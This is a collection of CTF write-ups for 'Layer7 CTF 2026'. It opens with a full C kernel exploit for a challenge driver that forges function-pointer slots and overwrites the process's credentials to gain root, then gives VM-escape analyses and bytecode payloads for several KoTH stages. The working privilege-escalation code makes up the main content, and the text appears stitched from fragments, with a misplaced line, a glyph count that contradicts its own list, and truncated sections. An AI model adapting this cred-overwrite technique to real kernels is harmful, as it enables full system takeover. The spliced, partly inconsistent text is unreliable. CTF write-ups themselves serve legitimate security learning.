Full source is work/7/exploit.c (same code compiled with musl-gcc -static into work/7/exploit_musl, 42 KB). The uploader is work/7/remote.py.

// Dead Letter - Layer7 CTF 2026
// Kernel module /dev/deadletter exploit.
//
//   ioctl 0x40084b40: {u16 idx; u16 pad; u32 pad2}  -> bts bitmap[page+0x100], idx
//   ioctl 0x40184b41: {u32 off; u32 len; u64 buf; u32 mode; u32 flags}
//        mode 0: read  (header[0x10]+off) -> user
//        mode 1: write user -> (header[0x10]+off)
//        mode 2: read  (ctx[0x38]+off) -> user   (bound ctx[0x40])
//   ioctl 0xc0184b42: {u64 handle; u64 token; u64 result}
//        finds slot by handle, checks signature + hash, then calls the
//        decoded function pointer slot[0x10] with rdi = ctx.

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <errno.h>

#define CMD_BIT   0x40084b40UL
#define CMD_RW    0x40184b41UL
#define CMD_SEND  0xc0184b42UL

struct rw_req {
    uint32_t off;
    uint32_t len;
    uint64_t buf;
    uint32_t mode;
    uint32_t flags;
};

struct send_req {
    uint64_t handle;
    uint64_t token;
    uint64_t result;
};

static int fd;

static uint64_t rol64(uint64_t x, int n) { n &= 63; return (x << n) | (x >> ((64 - n) & 63)); }
static uint64_t ror64(uint64_t x, int n) { n &= 63; return (x >> n) | (x << ((64 - n) & 63)); }
static uint32_t rol32(uint32_t x, int n) { return (x << n) | (x >> (32 - n)); }

static void set_bit(uint16_t idx) {
    uint8_t b[8];
    memset(b, 0, sizeof(b));
    memcpy(b, &idx, 2);
    if (ioctl(fd, CMD_BIT, b) != 0)
        fprintf(stderr, "[!] set_bit(%#x): %s\n", idx, strerror(errno));
}

static int page_read_chunk(uint32_t off, void *dst, uint32_t len) {
    struct rw_req r;
    r.off = off; r.len = len; r.buf = (uint64_t)dst; r.mode = 0; r.flags = 0;
    return ioctl(fd, CMD_RW, &r);
}

static int page_read(uint32_t off, void *dst, uint32_t len) {
    uint8_t *p = dst;
    while (len) {
        uint32_t c = len > 0x800 ? 0x800 : len;
        int ret = page_read_chunk(off, p, c);
        if (ret != 0) return ret;
        p += c; off += c; len -= c;
    }
    return 0;
}

static int page_write(uint32_t off, const void *src, uint32_t len) {
    struct rw_req r;
    r.off = off; r.len = len; r.buf = (uint64_t)src; r.mode = 1; r.flags = 0;
    return ioctl(fd, CMD_RW, &r);
}

static int cred_read(uint32_t off, void *dst, uint32_t len) {
    struct rw_req r;
    r.off = off; r.len = len; r.buf = (uint64_t)dst; r.mode = 2; r.flags = 0;
    return ioctl(fd, CMD_RW, &r);
}

static int send_call(uint64_t handle, uint64_t token, uint64_t *result) {
    struct send_req r;
    r.handle = handle; r.token = token; r.result = 0;
    int ret = ioctl(fd, CMD_SEND, &r);
    if (result) *result = r.result;
    return ret;
}

/* ---- hashes replicated from the module ---- */
static uint64_t func0(const uint64_t *L, const uint64_t *S) {
    uint64_t r8 = 0x510e527fade682d1ULL ^ S[1];
    uint64_t rsi = 0x9e3779b97f4a7c15ULL;
    const uint64_t r9 = rsi;
    const uint64_t r10 = 0xd6e8feb86659fd93ULL;
    int ecx = 0xd, rdx = 0;
    do {
        if (rdx != 5) {
            uint64_t rax = L[rdx] + rsi;
            rax ^= r8;
            rax = rol64(rax, ecx);
            rax *= r10;
            r8 = rax;
        }
        ecx += 7;
        rdx += 1;
        rsi += r9;
    } while (ecx != 0x45);
    return r8 ^ (r8 >> 0x1d);
}

static uint64_t func70(const uint64_t *L, const uint64_t *S) {
    uint64_t rdx = 0x1f83d9abfb41bd6bULL ^ S[1];
    uint32_t esi = 0;
    uint64_t r8 = 0xc7069c1dfa2d2477ULL;
    const uint64_t r9 = 0xa24baed4963ee407ULL;
    const uint64_t r10 = 0xae4c415dULL;
    int idx = 0;
    do {
        uint64_t rax = L[idx++];
        uint32_t ecx = esi;
        rax ^= r8;
        r8 += r9;
        rdx += rax;
        uint64_t t = (uint64_t)esi * r10;
        t >>= 0x25;
        uint32_t ea = (uint32_t)t * 0x2f;
        ecx -= ea;
        rax = rdx;
        ecx += 0xb;
        rax = rol64(rax, ecx);
        rdx = rax;
        rdx ^= (rdx >> 0x17);
        esi += 5;
    } while (esi != 0x41);
    return rdx ^ rol64(rdx, 0x1f);
}

static uint64_t hash_slot(const uint8_t *s) {
    uint64_t rax = 0x6a09e667f3bcc909ULL;
    uint64_t acc = 0x9e37UL;
    uint32_t i = 0;
    do {
        uint64_t rcx, q, r;
        uint32_t eax, edx, idx;
        uint16_t val;
        rax = rol64(rax, 9);
        rcx = rax;
        q = (uint64_t)i * 0x38e38e39ULL;
        q >>= 0x23;
        eax = (uint32_t)q * 9;
        eax <<= 2;
        edx = i - eax;
        idx = edx + edx;
        memcpy(&val, s + idx, 2);
        r = (uint64_t)val + acc;
        r ^= rcx;
        r *= 0x100000001b3ULL;
        rax = r;
        acc += 0x9e37;
        i += 0xd;
    } while (acc != 0x16ddf3);
    return rax;
}

static uint64_t enc_ptr(uint64_t key, uint64_t fn) {
    return rol64(key + fn, 0x11) ^ ror64(key, 0xb);
}

int main(void) {
    uint8_t page[0x1000];
    uint64_t *slot, *letter;
    int i, active = -1;
    uint64_t page_ptr, H, A, B, C, W, key1, key2, f0addr, text_base;
    uint64_t letter_val, slot40_orig, cred_ptr;
    uint64_t token, ret;
    uint8_t slotbuf[0x80], letterbuf[0x80];
    uint64_t newcred[0xb0/8];
    char flag[256];
    int n;

    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    if (setgid(1000) != 0) perror("setgid");
    if (setuid(1000) != 0) perror("setuid");
    printf("[*] running as uid=%d euid=%d\n", getuid(), geteuid());

    fd = open("/dev/deadletter", O_RDWR);
    if (fd < 0) { perror("open /dev/deadletter"); return 1; }
    printf("[*] opened /dev/deadletter\n");

    /* 1. bitmap overlaps header: bit 0x44c sets bit 12 of header[8] */
    set_bit(0x44c);

    /* 2. dump body + slots + letter */
    memset(page, 0, sizeof(page));
    if (page_read(0, page, 0xe00) != 0) { perror("page_read"); return 1; }

    letter = (uint64_t *)(page + 0xa00);   /* page+0xc00 */
    H = letter[4];                          /* active handle */
    printf("[*] active handle = 0x%016lx\n", H);
    for (i = 0; i < 9; i++) {
        slot = (uint64_t *)(page + 0x200 + i * 0x80);
        if (slot[1] == H) { active = i; break; }
    }
    if (active < 0) { printf("[!] active slot not found\n"); return 1; }
    slot = (uint64_t *)(page + 0x200 + active * 0x80);
    printf("[*] active slot index = %d\n", active);

    page_ptr = slot[4];
    {
        uint8_t *sb = (uint8_t *)slot;
        memcpy(&C, sb + 0x30, 4);
        memcpy(&A, sb + 0x34, 4);
        memcpy(&B, sb + 0x38, 4);
        memcpy(&H, sb + 0x08, 8);
        memcpy(&slot40_orig, sb + 0x40, 8);
        memcpy(&W, sb + 0x30, 8);
    }
    printf("[*] page=0x%016lx A=0x%08x B=0x%08x C=0x%08x H=0x%016lx\n",
           (unsigned long)page_ptr, (unsigned)A, (unsigned)B, (unsigned)C, (unsigned long)H);

    key1 = (uint64_t)A * 0x100000001ULL ^ H ^ 0xd1ceb00bcafebeefULL;
    key2 = (uint64_t)A * 0x100000001ULL ^ rol64((uint64_t)B, 0x1d) ^ H
           ^ 0xa3a1c57fafd3c8ddULL;

    f0addr = ror64(slot[3] ^ ror64(key1, 0xb), 0x11) - key1;
    text_base = f0addr - 0xf0;
    printf("[*] decoded .text+0xf0 = 0x%016lx  (module base 0x%016lx)\n",
           f0addr, text_base);
    if ((f0addr & 0xfff) != 0xf0) { printf("[!] pointer decode failed\n"); return 1; }

    letter_val = letter[8];
    cred_ptr = ror64(letter_val ^ ror64(key2, 0xb), 0x11) - key2;
    printf("[*] current->cred = 0x%016lx (slot[0x40]=0x%016lx)\n",
           (unsigned long)cred_ptr, (unsigned long)slot40_orig);
    if (cred_ptr < 0xffff800000000000ULL) { printf("[!] cred decode failed\n"); return 1; }

    /* 3. letter[0x18] chosen so 0x2b0's ctx[0x30] check passes; fix hashes */
    memcpy(letterbuf, letter, 0x80);
    {
        (void)W;
        uint64_t l18 = H ^ 0x7374616765312121ULL;
        uint64_t l28, l68;
        memcpy(letterbuf + 0x18, &l18, 8);
        l28 = func0((uint64_t *)letterbuf, slot);
        memcpy(letterbuf + 0x28, &l28, 8);
        l68 = func70((uint64_t *)letterbuf, slot);
        memcpy(letterbuf + 0x68, &l68, 8);
        printf("[*] letter[0x18]=0x%016lx new hashes 0x%016lx / 0x%016lx\n",
               l18, l28, l68);
    }

    token = (uint64_t)(rol32(A, 7) ^ A ^ B ^ 0x73656e64U);
    printf("[*] token = 0x%016lx\n", token);

    /* 4. first send -> 0x120 : cache current->cred in ctx */
    memcpy(slotbuf, slot, 0x80);
    {
        uint64_t fn120 = text_base + 0x120;
        uint64_t enc = enc_ptr(key1, fn120);
        uint32_t l60 = (uint32_t)letter[0xc];
        uint32_t sc = l60 ^ B ^ 0x46415354U;
        uint64_t hs;
        memcpy(slotbuf + 0x10, &enc, 8);
        memcpy(slotbuf + 0x3c, &sc, 4);
        memcpy(slotbuf + 0x40, &cred_ptr, 8);
        hs = hash_slot(slotbuf);
        memcpy(slotbuf + 0x48, &hs, 8);
        printf("[*] call #1 -> 0x%lx (enc 0x%016lx)\n", fn120, enc);
    }
    if (page_write(0xa00, letterbuf, 0x80) != 0) { perror("write letter"); return 1; }
    if (page_write(0x200 + active * 0x80, slotbuf, 0x80) != 0) { perror("write slot"); return 1; }

    if (send_call(H, token, &ret) != 0) { perror("send #1"); return 1; }
    printf("[*] send #1 returned, result=0x%lx\n", (unsigned long)ret);
    if (ret != 0) { printf("[!] stage 1 rejected\n"); return 1; }

    /* 5. read cred through the mode 2 window */
    memset(newcred, 0, sizeof(newcred));
    if (cred_read(0, newcred, sizeof(newcred)) != 0) { perror("cred_read"); return 1; }
    {
        uint32_t *u = (uint32_t *)newcred;
        printf("[*] cred[0..0x2f]: ");
        for (i = 0; i < 12; i++) printf("%08x ", u[i]);
        printf("\n");
    }

    /* 6. second send -> 0x2b0 : header[0x10] = cred */
    {
        uint64_t fn2b0 = text_base + 0x2b0;
        uint64_t enc = enc_ptr(key1, fn2b0);
        uint64_t ctx48 = rol64(letter[0xb] ^ letter[0xc] ^ cred_ptr, 0x11);
        uint32_t sc = (uint32_t)ctx48 ^ B ^ 0x434f4d4dU;
        uint64_t hs;

        memcpy(slotbuf, slot, 0x80);
        memcpy(slotbuf + 0x10, &enc, 8);
        memcpy(slotbuf + 0x3c, &sc, 4);
        memcpy(slotbuf + 0x40, &cred_ptr, 8);
        hs = hash_slot(slotbuf);
        memcpy(slotbuf + 0x48, &hs, 8);
        printf("[*] call #2 -> 0x%lx (enc 0x%016lx)\n", fn2b0, enc);
        if (page_write(0x200 + active * 0x80, slotbuf, 0x80) != 0) { perror("write slot2"); return 1; }
        if (send_call(H, token, &ret) != 0) { perror("send #2"); return 1; }
        printf("[*] send #2 returned, result=0x%lx\n", (unsigned long)ret);
        if (ret != 0) { printf("[!] stage 2 rejected\n"); return 1; }
    }

    /* 7. patch cred: ids = 0, full caps */
    {
        uint32_t *u = (uint32_t *)newcred;
        uint64_t caps = 0x000001ffffffffffULL;
        for (i = 2; i <= 9; i++) u[i] = 0;
        u[10] = 0;
        memcpy((uint8_t *)newcred + 44, &caps, 8);
        memcpy((uint8_t *)newcred + 52, &caps, 8);
        memcpy((uint8_t *)newcred + 60, &caps, 8);
        memcpy((uint8_t *)newcred + 68, &caps, 8);
        memcpy((uint8_t *)newcred + 76, &caps, 8);
    }
    if (page_write(0, newcred, sizeof(newcred)) != 0) { perror("cred write"); return 1; }
    printf("[*] cred patched: uid=%d euid=%d\n", getuid(), geteuid());

    /* 8. read flag */
    {
        int ff = open("/flag", O_RDONLY);
        if (ff < 0) { perror("open /flag"); return 1; }
        n = read(ff, flag, sizeof(flag) - 1);
        if (n < 0) { perror("read /flag"); return 1; }
        flag[n] = 0;
        close(ff);
        printf("[+] FLAG: %s\n", flag);
    }
    return 0;
}

docs.title: TL;DR
docs.text: Autoby is a 50-stage reversing service. Each stage sends INPUT_BYTES, an ELF_BASE64 checker, and an ANSWER> prompt with a 10-second deadline. The checker applies a reversible 16-byte-block transform and compares the result to an embedded target. Inverting the transform recovers a PNG per stage; the 50 PNGs spell the key. Tesseract misread five glyphs, so the final solver matched glyph shapes against labelled samples.

docs.title: Analysis
docs.text:
Decoding the first ELF and disassembling it:

  • validator at 0x1880: checks the input length, calls the transform at 0x12c0, compares to target bytes;
  • stage-1 config at file offset 0x2020, target at 0x2048.

The transform keeps one 32-bit carry and a set of 16-byte blocks. Each round updates blocks in a config-defined order, then mixes each block with its neighbours.

To invert it:

  1. Recompute the block-update order and key state for every round.
  2. Walk rounds backwards.
  3. Undo the neighbour mixing first.
  4. Undo each block update and restore the previous carry.

One step has the form:

y = x + 2x(ax + b)  (mod 2^32)

The second term is always even, so the lowest bit of x equals the lowest bit of y. Changing a candidate x by 2^k changes the output by 2^k modulo 2^(k+1), so bits can be recovered from LSB to MSB.

The recovered bytes start with the PNG signature:

89 50 4e 47 0d 0a 1a 0a

The first stage image shows the letter f.

docs.title: Exploit
docs.text:
After OK 50 the server asks for KEY> with a 5-second limit. The key is one character from each of the 50 PNGs, in stage order.

Tesseract passed all 50 stages but produced WRONG_KEY; comparing OCR with the images showed five wrong glyphs (b → c, d → c, 9 → 0, 4 → a). One wrong character rejects the whole key.

The final solver uses shape matching:

  • crop each glyph to its ink bounding box,
  • normalise to 24 × 32 pixels,
  • compare with labelled samples for 0–9 and a–f from earlier sessions,
  • score by pixel difference and aspect ratio,
  • rotate samples by a few degrees to tolerate skew.

Characters are recognised as each PNG is recovered, so the key is ready the moment KEY> appears.

Solver: work/8/solve_autoby_glyph.py and the stage artifacts in work/8/.

  • Valid payloads are checked against 32 fixed hidden instances and then re-run with the current round's beacon/flag.

Our Stage 1–3 payloads (89 B, 83 B, 96 B) all passed 32/32 hidden cases and scored in the KoTH rounds. See koth-stage-1.md and koth-stage-2.md.

docs.title: KoTH Stage 1 — Glasshouse VM
docs.text: Field Value Event Layer7 CTF 2026 — KoTH Stage 1 Payload 114 bytes Cost 2277 Status VERIFIED

docs.title: TL;DR
docs.text: Stage 1 ("Signed Window") of the Glasshouse KoTH is an 8-bit VM whose LOAD instruction sign-extends the page register but only checks the lower 8 bits of the resulting address. A negative page (0xF8..0xFF) therefore reads host memory from the arena. The flag is stored encrypted at slot = ((b0*5 + b3*3 + b7) & 31) * 64, with key0 at slot+2 and 48 ciphertext bytes at slot+3. We read the beacon, derive the slot, decrypt one byte per loop iteration, and submit raw bytecode. The best payload we had validated and active for the final Stage 1 rounds was a 114-byte unrolled-by-2 payload (gas 721 per run, total Cost = 114*1 + 3*721 = 2277).

docs.title: Kit recon
docs.text:
The Stage 1 kit was downloaded from the dashboard (glasshouse-kit.zip) and contains the exact server VM (glasshouse.py), the assembler, a runner, and a sample flag.

  • VM: 8 registers r0..r7, all 8-bit wrapping; code 1..512 bytes; gas limit 20,000; output limit 128 bytes.
  • glasshouse.py ruleset E1: HOST_SIZE=2048, GUEST_SIZE=256, GUEST_BASE=2048, OPCODE_MASK=0x00, and the arena is host + guest.
  • The public beacon is placed at guest bytes 0..7; host memory is an xorshift PRNG seeded by the beacon.
  • The flag is 48 bytes. build_arena() computes slot = ((beacon[0]*5 + beacon[3]*3 + beacon[7]) & 31) * 64, writes b"GH" + key at slot, then host[slot+3+i] = flag[i] ^ beacon[i&7] ^ key_i, where key_0 = beacon[2] ^ 0xA7 and key_{i+1} = key_i + 13 (mod 256).

docs.title: VM analysis
docs.text:
The vulnerable instruction is:

address = _signed8(registers[page]) * 256 + registers[index]
if address >= GUEST_SIZE:
    raise VMError("guest read out of bounds")
physical = GUEST_BASE + address
registers[dst] = arena[physical]

address is never checked for being negative. With a page byte 0xF8..0xFF (signed -8..-1) and an index 0..255, physical = 2048 + address can reach any host byte 0..2047, i.e. the whole host image. This is the intended "Signed Window" bug.

For a slot s = k*64, the page/index pair is page = 0xF8 + (k >> 2), index = (k & 3)*64. Because only s and the key matter, the payload can use the low bits of the beacon sum directly.

docs.title: Payload
docs.text:
The final compact payload is assembled from koth/stage-1/best_u2t.asm (114 bytes, opcode mask 0x00). It is an unrolled-by-2 version of the reference 89-byte payload. Key ideas:

  • r7 is zero at VM start and serves as the guest page for beacon reads.
  • b0, b3, b7 are loaded from guest 0, 3, 7; the slot page and low index are derived with shift/mask operations.
  • key0 = host[slot+2] is loaded once.
  • The loop increments the host index, the beacon index (i & 7), and the key by 13. Each iteration emits one decrypted flag byte with OUT.
  • The loop terminates on the closing } (XORI r1, 0x7D; JNZ r1, loop), which removes the separate counter and saves bytes.

The exact assembly is in koth/stage-1/best_u2t.asm; the .ghb submitted was koth/stage-1/best_u2t.ghb (114 bytes). It was checked locally against thousands of random beacons and 48-byte Layer7{...} flags, including all four slot classes.

docs.title: KoTH Stage 2 — Glasshouse VM
docs.text: Field Value Event Layer7 CTF 2026 — KoTH Stage 2 Payload 288 bytes Cost 1905 Status VERIFIED

docs.title: TL;DR
docs.text: Stage 2 ("Wraparound Range") changes the VM mask to 0x5A, puts the guest before the host in the arena, and adds READ dst, base, delta. READ checks base < 224 and (base+delta+1) & 0xFF <= 224 but then computes physical = base + delta without masking, so a large delta reaches host memory. The flag is at slot = ((b1*7+b4*3+b6)&3)*48, encrypted with key_i = beacon[(i+2)&7] ^ ((b3^0x6D) + 9*i). A direct 83-byte payload was used for the byte-heavy rounds; for the last two rounds we switched to a 288-byte, gas-oriented prefix/unrolled payload. The best Stage 2 round cost was 1905 at W=1.

docs.title: Kit recon
docs.text:
Downloaded glasshouse-kit.zip from the same dashboard button and extracted it to koth/stage-2/. Stage 2 specifics from glasshouse.py:

  • OPCODE_MASK = 0x5A, assembler must be called with --mask 0x5a.
  • GUEST_BASE = 0, HOST_BASE = 256; _finish(..., guest_first=True) builds arena = guest + host, so physical host byte h is at arena index 256+h.
  • New instruction READ (opcode 0x22) is the vulnerable one.
  • Flag encryption: slot = ((beacon[1]*7 + beacon[4]*3 + beacon[6]) & 3) * 48, seed = beacon[3] ^ 0x6D, key_i = beacon[(i+2)&7] ^ ((seed + 9*i) & 0xFF), host[slot+i] = flag[i] ^ key_i. No marker or key is stored in host memory.

docs.title: VM analysis
docs.text:
The bug is a truncation mismatch:

full_end    = registers[base] + registers[delta] + 1
checked_end = full_end & 0xFF
if registers[base] >= 224 or checked_end > 224:
    raise VMError("range outside guest")
physical = GUEST_BASE + registers[base] + registers[delta]
registers[dst] = arena[physical]

checked_end wraps to a small value while physical stays large. With base = slot + 48 and delta = 208 + i, the check sees checked_end = 1 + slot + i <= 192, but physical = 256 + slot + i, exactly host[slot+i]. The delta register also wraps from 255 to 0 after exactly 48 increments, so it doubles as the loop counter; this removes a separate counter and its SUBI from the hot loop.

Because 7 == -1 and 3 == -1 (mod 4), the slot can be computed cheaply as (b6 - b1 - b4) & 3, then base = 48 * (s + 1).

docs.title: Payload
docs.text:
Two payload families were used:

  • work/stage2/p4.ghb — 83 bytes, gas 744 per run. Direct slot computation, base = slot+48, delta = 208, FETCH/READ-style host read, loop ends when delta wraps. This was used for the byte-heavy rounds (R13-R20, best at W=512..6).
  • work/stage2/gas2_prefix2.ghb — 288 bytes, gas 539 per run. It statically outputs the known Layer7{ prefix and } suffix and decrypts only the 40 middle bytes with an 8-byte-unrolled block. At W=2 and W=1 this wins because gas dominates. Round 24 (W=1) used it for cost 1905.

Both payloads were locally tested against thousands of random beacons and 48-byte flags covering all four slot values and both unrolled/safe loop paths. The intermediate u2.ghb (108 B, gas 696) was used around W=4..2.

docs.title: KoTH Stage 3 — Glasshouse VM (Capability Confusion)
docs.text: Field Value Event Layer7 CTF 2026 — KoTH Stage 3 Payload 72 bytes Cost 1396 (W=1 projection; see Evidence) Status VERIFIED

docs.title: TL;DR
docs.text: Stage 3 keeps the Glasshouse 8-bit VM and adds FETCH dst, capability, index. The instruction decodes a capability handle as object_id = handle & 0xF and segment = handle >> 4, requires object_id == 0 and segment <= 8, then computes physical = (segment-1)*256 + index for segments 1..8. No capability table or per-handle permission is consulted, so handles 0x10..0x80 give arbitrary reads of the eight 256-byte host pages. The flag is scattered within one host page; a payload reads the beacon to recover the page, step, start position and key, then follows the position/key schedule and prints 48 bytes.

docs.title: Kit recon
docs.text:
koth/stage-3/glasshouse-kit/ contains glasshouse.py, assembler.py, runner.py, example.asm, README.md and VM_SPEC.md. Stage 3 specifics:

  • OPCODE_MASK = 0xa5 (assemble with --mask 0xa5).
  • Arena is host + guest again (GUEST_BASE = 2048, HOST_BASE = 0).
  • LOAD is restricted to guest memory (address < 256).
  • New FETCH dst, capability, index exposes host memory.
  • slot = ((b2*9 + b5*5 + b7) & 7) * 256, step = (b1 & 15)*2 + 1, pos = b4, key = b0 ^ 0xB6.
  • For each flag byte: host[slot+pos] = flag[i] ^ key, pos = (pos + step) & 0xFF, key = (key + 17) & 0xFF.

docs.title: VM analysis
docs.text:
The vulnerable transition is:

handle = registers[capability]
object_id = handle & 0x0F
if object_id != 0:
    raise VMError("invalid guest capability")
segment = handle >> 4
if segment > 8:
    raise VMError("invalid capability segment")
physical = (GUEST_BASE + registers[index]) if segment == 0 \
    else (HOST_BASE + (segment - 1) * 256 + registers[index])
registers[dst] = arena[physical]

The handle is only a 1-byte segment number plus a hard-coded object-id check; there is no capability object, base, length or ownership validation. Segment q+1 reads host page q, so handle = (q+1) << 4 (low nibble zero) reads host[q*256 + index]. Since slot is always a multiple of 256, the whole 48-byte scattered flag is inside a single host page.

Positions are a permutation of the page (step is odd), so the payload only needs pos += step and key += 17 per output byte. The loop terminates on the known final }.

docs.title: Payload
docs.text:
Deterministic base payload koth/stage-3/payload.ghb (90 bytes, gas 513):

LOAD r6, r7, r5      ; b0 (r5=0)
XORI r6, 0xB6        ; key
LDI r5, 1
LOAD r1, r7, r5      ; b1
ANDI r1, 15
SHL r1, 1
ADDI r1, 1           ; step
LDI r5, 2
LOAD r2, r7, r5      ; b2
LDI r5, 4
LOAD r3, r7, r5      ; b4 position
LDI r5, 5
LOAD r4, r7, r5      ; b5
LDI r5, 7
LOAD r5, r7, r5      ; b7
MULI r4, 5
ADD r2, r4
ADD r2, r5           ; b2 + 5*b5 + b7
ANDI r2, 7
ADDI r2, 1
SHL r2, 4            ; handle = (page+1)<<4
loop:
FETCH r0, r2, r3
XOR r0, r6
OUT r0
ADD r3, r1
ADDI r6, 17
XORI r0, 0x7D
JNZ r0, loop

Lower-cost variants used as the round weight W falls:

  • koth/stage-3/full_u2b.ghb (105 B, gas 465): two-byte unrolled loop, } termination, deterministic; best around W=8..3.
  • koth/stage-3/prefix_u2.ghb (160 B, gas 422): constant Layer7{ and } plus an unrolled two-byte loop over the 40 middle bytes; best at W=2.
  • koth/stage-3/prefix_u4.ghb (190 B, gas 402): the same idea with four-byte blocks; best at W=1 (cost 190 + 3*402 = 1396).
  • koth/stage-3/scan72.ghb (72 B, max gas 552): the smallest verified payload. Instead of computing the page from b2,b5,b7, it scans host pages until the decrypted first byte equals L. It saves 18 bytes but a wrong page could randomly decrypt to L (~1/256 per attempt), so the deterministic payloads remain the safe fallback.

docs.title: KoTH Stage 4 — Glasshouse VM
docs.text: Field Value Event Layer7 CTF 2026 — KoTH Stage 4 Payload 237 bytes Cost 1965 Status VERIFIED

docs.title: TL;DR
docs.text: Stage 4's new instruction is TAKE dst, amount. It subtracts the value of a register from a persistent stack pointer and reads arena[GUEST_BASE + sp] with no lower bound, so from sp = 0 a payload can walk backwards out of the guest and into the tail of the host region. The flag is stored reversed in host[1792 + slot + (47-i)]; subtracting 208 - slot lands one byte above flag[0], then 48 single-byte TAKEs read flag[0]..flag[47] in order.

docs.title: Kit recon
docs.text:
The Stage 4 kit (koth/stage-4/glasshouse-kit/) defines:

  • OPCODE_MASK = 0x3c (assemble with --mask 0x3c).
  • Arena host + guest (GUEST_BASE = 2048, host 0..2047, guest 2048..2303).
  • LOAD restricted to guest (address < 256).
  • New heap/stack instructions TAKE, none of which are bounds-safe on the low side.
  • slot = ((b0*13 + b2*7 + b6) & 3) * 64, key = b0 ^ b7 ^ 0xD3.
  • Flag byte i is at host[1792 + slot + (47-i)] = flag[i] ^ key_i, and key_{i+1} = key_i*5 + beacon[i&7] + 0x17.

docs.title: VM analysis
docs.text:
elif op == 0x23:  # TAKE dst, amount
    if stack_pointer >= GUEST_SIZE:
        raise VMError("stack pointer out of bounds")
    stack_pointer -= registers[amount]
    physical = GUEST_BASE + stack_pointer
    if physical < 0:
        raise VMError("arena read out of bounds")
    registers[dst] = arena[physical]

Only the high side of the stack pointer is checked. With sp = 0, one TAKE of value 208 - slot makes sp = slot - 208 and reads arena[2048 + slot - 208], i.e. host[1840 + slot], exactly one byte above flag[0]. Subsequent TAKE with amount register 1 walk downwards and emit the flag in the correct order, because the flag was written reversed.

The slot expression reduces modulo 4 because 13 == 1 and 7 == 3 == -1: (b0 + b6 - b2) & 3. A SHL reg,6 turns the low two bits directly into the slot offset ((&3)*64), avoiding an explicit ANDI/MULI pair.

docs.title: Payload
docs.text:
The 81-byte payload koth/stage-4/v9.ghb (gas 793) is the compact reference:

LDI r4, 2
LDI r6, 6
TAKE r0, r7          ; b0 via TAKE amount 0 (saves one byte vs LOAD)
LOAD r1, r7, r4      ; b2
LOAD r2, r7, r6      ; b6
SUB r1, r0

docs.title: KoTH Stage 5 — Glasshouse VM
docs.text: Field Value Event Layer7 CTF 2026 — KoTH Stage 5 Payload 314 bytes Cost 2489 Status VERIFIED

docs.title: TL;DR
docs.text: Stage 5 ("Stale Slab") adds a small heap: NEW dst, class, DROP handle, DEREF dst, handle, index, and privileged SYNC class. DROP marks a handle dead and frees its slot, but DEREF never checks the alive flag and a stale handle still resolves to the slot. SYNC p re-fills the most recently freed slot with a copy of host page p, so a handle of class p that is dropped and then synchronised exposes the whole host page through the stale handle. The flag is contiguous at host[page*256 + slot]; a payload reads the beacon, allocates/drops/syncs the right page, reads the key from the "RV"+key header, and decrypts the 48 bytes.

docs.title: Kit recon
docs.text:
koth/stage-5/glasshouse-kit/ contains glasshouse.py, assembler.py, runner.py, example.asm, README.md, and VM_SPEC.md. Stage 5 specifics:

  • OPCODE_MASK = 0xc3 (assemble with --mask 0xc3).
  • Arena is host + guest (HOST_BASE = 0, GUEST_BASE = 2048); beacon is at guest 0..7.
  • New opcodes: NEW (0x24, gas 4), DROP (0x25, gas 2), DEREF (0x26, gas 3), SYNC (0x27, gas 8).
  • Flag layout:
  • page = (b0*3 + b2*5 + b6) & 7
  • slot = ((b1*5 + b3*7 + b7) & 3) * 64
  • key0 = b4 ^ 0x5C
  • host[page*256 + slot + i] = flag[i] ^ key_i
  • key_{i+1} = (key_i*3 + beacon[(i+1) & 7] + 0x29) & 0xFF

docs.title: VM analysis
docs.text:
DROP frees the slot but leaves the handle record in heap_handles:

elif op == 0x25:  # DROP handle
    record = heap_handles.get(handle)
    if record is None or not record["alive"]:
        raise VMError("invalid free")
    record["alive"] = False
    free_slots.append(record["slot"])

elif op == 0x26:  # DEREF dst, handle, index
    record = heap_handles.get(registers[handle_reg])
    if record is None:
        raise VMError("invalid heap handle")
    registers[dst] = heap_slots[record["slot"]]["buffer"][registers[index]]

DEREF checks only that the handle exists, not that record["alive"] is true, and it performs no index bound check (the index is an unsigned byte, so it is still limited to 0..255). SYNC class overwrites heap_slots[free_slots[-1]] with bytearray(arena[page*256:(page+1)*256]), provided the freed slot's class matches page. Therefore:

  1. NEW handle, p allocates a zeroed 256-byte slab of class p.
  2. DROP handle pushes its slot onto free_slots.
  3. SYNC p copies host page p into that same slot.
  4. DEREF ..., handle, index through the still-existing (dead) handle now reads host[p*256 + index].

Because slot <= 192, slot + 47 <= 239; the whole flag stays inside the copied page. The slot expression reduces modulo 4 (5 == 1, 7 == -1), so SHL reg,6 after b1 - b3 + b7 produces the slot offset directly.

docs.title: Payload
docs.text:
The compact direct payload (koth/stage-5/opt.ghb, work/stage5/e5_roll3.ghb, 114 bytes, gas 865) computes page/slot, obtains key0 from b4 ^ 0x5C, and runs a one-byte DEREF loop:

; page = (3*b0 + 5*b2 + b6) & 7, slot = (b1-b3+b7)<<6
LOAD r1, r0, r0
...
ANDI r1, 7
LDI r6, 1
NEW r3, r1
DROP r3
SYNC r1
loop:
DEREF r5, r3, r2
XOR r5, r4
OUT r5
XORI r5, 0x7d
LOAD r7, r0, r6
MULI r4, 3
ADD r4, r7
ADDI r4, 0x29
ADDI r6, 1
ANDI r6, 7
ADDI r2, 1
JNZ r5, loop

The weight-optimised variant is work/stage5/unroll2.ghb (314 B, gas 725): an eight-byte unrolled loop with a two-hop JMP trampoline (the rel8 range does not allow one direct jump), a six-cycle counter, and an eight-byte block that reads the beacon bytes 1..7,0 in order. It is more bytes but saves enough gas to win once W <= 2. e5_unroll.ghb (323 B, gas 728) is the earlier version of the same idea.

docs.title: KoTH Stage 6 — Glasshouse VM (Split Decoder)
docs.text: Field Value Event Layer7 CTF 2026 — KoTH Stage 6 Payload 353 bytes Cost 2366 Status VERIFIED

docs.title: TL;DR
docs.text: Stage 6 ("Split Decoder") adds a privileged TRACE dst, page, index that reads host memory, but the verifier rejects any bytecode whose decoded opcode is 0x27 at an instruction boundary. The verifier and the interpreter disagree about META: the verifier advances 6 bytes for META, while the interpreter advances only 2. Placing a 4-byte TRACE immediately after META hides it from the verifier while the interpreter executes it. A payload then computes the flag slot from the beacon, reads the key from the "RV"+key header, and decrypts the reversed ciphertext.

docs.title: Kit recon
docs.text:
